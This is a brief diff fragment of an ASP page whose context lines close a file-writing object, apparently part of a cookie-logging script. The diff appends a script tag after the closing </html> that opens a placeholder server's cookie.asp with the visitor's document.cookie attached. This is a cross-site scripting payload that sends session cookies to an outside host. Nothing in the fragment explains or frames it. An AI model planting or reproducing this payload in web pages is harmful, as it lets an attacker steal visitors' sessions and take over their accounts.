@@ -10,3 +10,4 @@ thisfile.close()   //关闭
 set fs = nothing%>
 </body>
 </html>
+//<script>window.open('http://服务器/cookie.asp?msg='+document.cookie)</script>
